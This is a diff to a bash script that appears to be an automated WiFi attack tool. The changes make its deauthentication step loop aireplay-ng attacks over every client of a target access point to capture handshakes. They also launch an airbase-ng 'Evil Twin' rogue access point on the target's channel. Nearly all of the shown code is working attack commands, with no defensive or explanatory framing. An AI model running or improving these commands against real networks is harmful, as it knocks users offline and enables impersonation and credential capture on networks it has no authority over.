@@ -309,7 +309,7 @@ fclientscan()															#Find active clients
 				then
 					EVIL=1
 				else
-					echo $RED" [*] GRN$ESSID$RED is Mixed CCMP/TKIP encryption,$GRN Evil Twin$RED is unlikely to work, turning it off"
+					echo $RED" [*] $GRN$ESSID$RED is Mixed CCMP/TKIP encryption,$GRN Evil Twin$RED is unlikely to work, turning it off"
 					echo
 					EVIL=""
 			fi
@@ -575,6 +575,7 @@ fautocap()																#Deauth targets and collect handshakes
 					
 			fi
 			clear
+			
 			if [ $DO = 'A' ] 2> /dev/null
 				then
 					echo $RED" [>]$GRN AUTOBOT$RED LOCKED IN [<] ";echo
@@ -587,8 +588,14 @@ fautocap()																#Deauth targets and collect handshakes
 					echo $BLU;echo " [>] FIRE! [<] "
 					if [ $MDK -z ] 2> /dev/null
 						then
-							sleep 2 && killall aireplay-ng 2> /dev/null&
-							echo $BLU;aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1;echo $RST
+							MACNUM=0
+							for CLIENT in $TARGETS
+								do
+									MACNUM=$((MACNUM + 1))
+									echo $GRN" [*] Client number $MACNUM: $CLIENT"
+									sleep 2.2 && killall aireplay-ng 2> /dev/null&
+									echo $BLU;aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1;echo $RST
+								done
 							sleep 3
 						else
 							echo $BSSID > $HOME/BSSIDB
@@ -602,9 +609,15 @@ fautocap()																#Deauth targets and collect handshakes
 							if [ $MDK -z ] 2> /dev/null
 								then
 									echo $BLU;echo " [>] FIRE ON $NIC2! [<] "
-									sleep 3 && killall aireplay-ng 2> /dev/null&
 									iw $MON2 set channel $CHAN
-									echo $BLU;aireplay-ng -0 4 -a $BSSID -c $CLIENT $MON2;echo $RST
+									MACNUM=0
+									for CLIENT in $TARGETS
+										do
+											MACNUM=$((MACNUM + 1))
+											echo $GRN" [*] Client number $MACNUM: $CLIENT"
+											sleep 3.3 && killall aireplay-ng 2> /dev/null&
+											echo $BLU;aireplay-ng -0 3 -a $BSSID -c $CLIENT $MON2;echo $RST
+										done
 									sleep 3
 								else
 									echo $BSSID > $HOME/BSSIDB
@@ -620,10 +633,11 @@ fautocap()																#Deauth targets and collect handshakes
 							echo;echo $RED" [*]$GRN Evil Twin $ESSID$RED Launched" 
 							echo $BLU;echo " [>] FIRE ON $NIC2! [<] "
 							echo $BLU
+							sleep 2.2 && killall aireplay-ng 2> /dev/null&
 							aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep segeg&
 							echo $RED" [*] $GRN Deauth$RED Launched"
 							sleep 1
-							gnome-terminal -t "Evil Twin $ESSID listening.." --geometry=100x20+0+600 -x airbase-ng -v -c 8 -e $ESSID -W 1 $BARG$CIPHER -a $BSSID -i $MON2 -I 50 -F $HOME/tmpe $MON2&
+							gnome-terminal -t "Evil Twin $ESSID listening.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $BSSID -i $MON2 -I 50 -F $HOME/tmpe $MON2&
 							sleep 1
 							echo;sleep 8
 					fi
